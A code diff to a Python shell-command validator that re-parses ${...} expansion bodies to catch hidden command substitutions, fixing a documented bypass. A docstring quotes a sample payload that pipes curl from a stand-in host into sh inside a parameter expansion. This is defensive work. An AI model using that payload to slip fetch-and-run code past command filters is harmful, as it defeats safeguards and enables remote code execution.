@@ -18,6 +18,7 @@ This prevents bypass attacks that defeat regex-only detection:
 
 from __future__ import annotations
 
+import logging
 import re
 from dataclasses import dataclass, field
 from enum import Enum
@@ -29,8 +30,14 @@ if TYPE_CHECKING:
 
     from .rules import RiskLevel
 
+logger = logging.getLogger(__name__)
+
 # Maximum recursion depth for nested substitution validation
 MAX_SUBSTITUTION_DEPTH = 10
+
+# Text that opens a command/process substitution. Used to decide whether a ``${…}``
+# expansion body is worth re-parsing (see _substitutions_in_parameter).
+_SUBSTITUTION_INTRODUCERS: tuple[str, ...] = ("$(", "`", "<(", ">(")
 
 # Operators bashlex emits in a command-list node's parts. A well-formed list strictly alternates
 # segment/operator and ends on a segment; anything else is a malformed AST -> fail closed.
@@ -835,6 +842,10 @@ class SubstitutionValidator:
                     substitutions.append(sub_node)
                 return
 
+            if node.kind == "parameter":
+                substitutions.extend(self._substitutions_in_parameter(node, current_depth))
+                return
+
             # Recurse into child nodes
             for attr in ["parts", "command", "list", "pipe", "compound"]:
                 if hasattr(node, attr):
@@ -849,6 +860,51 @@ class SubstitutionValidator:
             visit(node, depth)
 
         return substitutions
+
+    def _substitutions_in_parameter(self, node: Any, depth: int) -> list[SubstitutionNode]:
+        """Extract substitutions written inside a ``${…}`` expansion body.
+
+        SECURITY (LAB-1731): bashlex's ``parameter`` node is CHILDLESS, so a ``$( )``,
+        backquote or ``<( )`` inside ``${…}`` produces no substitution node to walk — and
+        because the enclosing word is quote-delimited, the rule engine suppresses the same
+        span as a string literal. Both defences went blind over exactly the payload, and
+        ``echo "${z:-$(curl evil | sh)}"`` returned ALLOWED/SAFE.
+
+        The body is not lost, only unparsed: ``parameter.value`` carries it verbatim. Re-parse
+        it and hand the result to the normal walk, so the whitelist and the recursive checks
+        judge it the same way they judge a bare ``$( )``. That keeps ``${z:-$(date)}`` allowed
+        instead of blanket-denying every expansion containing a ``$``.
+
+        Node positions in the returned subtree are relative to the expansion body, not to the
+        outer command. Nothing on the validation path reads them; do not start.
+
+        A body that carries an introducer but will not re-parse is reported as an
+        undeterminable substitution (-> default deny) rather than dropped: refusing to decode
+        an attack must not be the same as finding none.
+        """
+        value = getattr(node, "value", None)
+        if not isinstance(value, str) or not any(intro in value for intro in _SUBSTITUTION_INTRODUCERS):
+            # Overwhelmingly the common case ($x, ${x:-plain}) - substring scan only, no re-parse.
+            return []
+
+        if depth < MAX_SUBSTITUTION_DEPTH:
+            try:
+                inner_ast = self.parser.parse(value)
+            except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
+                logger.debug("Unparseable parameter expansion body %r: %s", value, exc)
+            else:
+                return self.extract_substitutions(inner_ast, depth + 1)
+
+        return [
+            SubstitutionNode(
+                substitution_type=SubstitutionType.COMMAND,
+                inner_command=value,
+                base_command=None,
+                ast_node=node,
+                nested_substitutions=[],
+                depth=depth,
+            )
+        ]
 
     def _create_substitution_node(self, node: Any, sub_type: SubstitutionType, depth: int) -> SubstitutionNode | None:
         """Create a SubstitutionNode from an AST node.
